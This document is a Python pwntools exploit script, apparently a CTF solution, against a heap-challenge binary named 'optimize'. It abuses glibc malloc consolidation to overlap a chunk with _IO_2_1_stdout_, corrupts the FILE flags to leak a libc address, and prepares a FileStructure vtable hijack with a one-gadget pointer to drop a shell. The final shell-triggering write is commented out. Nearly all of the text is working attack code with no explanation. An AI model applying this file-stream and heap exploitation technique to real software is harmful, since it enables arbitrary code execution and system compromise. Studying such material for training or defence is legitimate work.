#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("optimize")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size.
# Return chunk index.
def malloc(size):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

# Select the "edit" option; send index & data.
def edit(index, data, discard=True):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    io.sendafter(b"data: ", data)
    if discard: io.recvuntil(b"> ")

# Select the "optimize" option; send value.
def optimize(mxfast):
    io.send(b"4")
    io.sendafter(b"size: ", f"{mxfast}".encode())
    io.recvuntil(b"> ")

io = start()
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

remainder = malloc(0x418)
guard = malloc(0x18)

free(remainder)

malloc(0x18) # Set the last_remainder

optimize(1) # Will reinit heap
optimize(0x80) # Trigger malloc consolidate



distance = libc.sym["_IO_2_1_stdout_"] - (libc.sym["main_arena"] + 0x58) - 0x20
malloc(distance)

stdout = malloc(0xf8)

NO_WRITES = 0x8
IO_CURRENTLY_PUTTING = 0x800
IO_IS_APPENDING = 0x1000
IO_MAGIC = 0xFBAD0000

flags = IO_MAGIC | IO_CURRENTLY_PUTTING | IO_IS_APPENDING
edit(stdout, p64(0) + p64(flags) + p64(0) * 3 + p8(0x88), False)
leaked = io.recvline()

IO_2_1_STDIN = u64(leaked[:8])

info("Leak: " + hex(IO_2_1_STDIN))

libc.address = IO_2_1_STDIN - libc.sym["_IO_2_1_stdin_"]
info("Libc addr: " + hex(libc.address))


# # Drop a shell
fs = FileStructure()
fs.flags = 0x8000 # disable locking
fs.vtable = libc.sym["_IO_str_jumps"] - 0x20

ptr = libc.address + 0x40e76

# edit(stdout, p64(0) + bytes(fs) + p64(ptr))

# =============================================================================

io.interactive()
